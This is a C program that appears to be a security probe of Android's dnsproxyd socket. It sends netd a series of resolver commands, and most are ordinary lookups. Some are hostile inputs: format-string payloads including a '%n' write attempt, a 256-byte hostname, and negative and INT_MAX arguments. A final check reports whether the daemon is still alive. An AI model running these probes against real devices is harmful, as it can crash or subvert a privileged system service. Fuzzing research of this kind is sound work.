#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <sys/time.h>

#define SOCK_PATH "/dev/socket/dnsproxyd"
#define BUF_SIZE 8192

static int connect_sock(void) {
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path)-1);
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd); return -1;
    }
    return fd;
}

static void probe(const char *label, const char *cmd, int len) {
    printf("%s\n", label);
    printf("  CMD: %s\n", cmd);
    int fd = connect_sock();
    if (fd < 0) { printf("  connect failed\n"); return; }
    
    int n = write(fd, cmd, len);
    
    struct timeval tv = {5, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    // Read all responses (might come in multiple chunks)
    char resp[BUF_SIZE];
    int total = 0;
    while (1) {
        n = read(fd, resp + total, sizeof(resp) - total - 1);
        if (n <= 0) break;
        total += n;
        if (total > 4000) break;
    }
    if (total > 0) {
        resp[total] = '\0';
        printf("  Recv %d bytes: ", total);
        for (int i = 0; i < total && i < 256; i++) {
            if (resp[i] >= 32 && resp[i] < 127) printf("%c", resp[i]);
            else printf("\\x%02x", (unsigned char)resp[i]);
        }
        printf("\n");
    } else {
        printf("  No response\n");
    }
    close(fd);
}

#define P(lbl, cmd) probe(lbl, cmd, sizeof(cmd))

int main(void) {
    printf("dnsproxyd v4 — correct arg counts\n\n");
    
    // getaddrinfo expects 8 args: cmd host service family socktype proto flags netid
    P("T1: getaddrinfo localhost (8 args)",
      "getaddrinfo localhost ^ 10 2 0 0 0");
    
    // gethostbyname expects 4 args: cmd netid host af
    P("T2: gethostbyname (4 args)",
      "gethostbyname 0 localhost 10");
    
    // gethostbyaddr expects 5 args: cmd netid addr addrlen af
    P("T3: gethostbyaddr (5 args)",
      "gethostbyaddr 0 127.0.0.1 4 2");
    
    // Try resolving a real domain (might work since wifi is connected)
    P("T4: getaddrinfo google.com",
      "getaddrinfo google.com ^ 2 1 0 0 0");
    
    // AF_INET=2, SOCK_STREAM=1
    P("T5: gethostbyname google.com",
      "gethostbyname 0 google.com 2");
    
    // Format string in hostname — will netd sprintf it?
    P("T6: format string %p%p%p%p",
      "getaddrinfo %p%p%p%p ^ 2 1 0 0 0");
    
    // Format string %n (write attempt)
    P("T7: format string %n",
      "getaddrinfo %n%n%n%n ^ 2 1 0 0 0");
    
    // Very long hostname to test buffer handling
    char longcmd[512];
    char host[257];
    memset(host, 'A', 256);
    host[256] = '\0';
    snprintf(longcmd, sizeof(longcmd), "getaddrinfo %s ^ 2 1 0 0 0", host);
    probe("T8: 256-byte hostname", longcmd, strlen(longcmd)+1);
    
    // Negative values
    P("T9: negative family -1",
      "getaddrinfo localhost ^ -1 1 0 0 0");
    
    P("T10: INT_MAX family",
      "getaddrinfo localhost ^ 2147483647 1 0 0 0");
    
    // Zero-length service
    P("T11: empty service",
      "getaddrinfo localhost  2 1 0 0 0");
    
    // NULL service (^ means null in this protocol)
    P("T12: service as port number",
      "getaddrinfo localhost 80 2 1 0 0 0");
    
    printf("\n=== HEALTH ===\n");
    int fd = connect_sock();
    if (fd >= 0) { printf("netd alive\n"); close(fd); }
    else printf("*** DEAD ***\n");
    return 0;
}
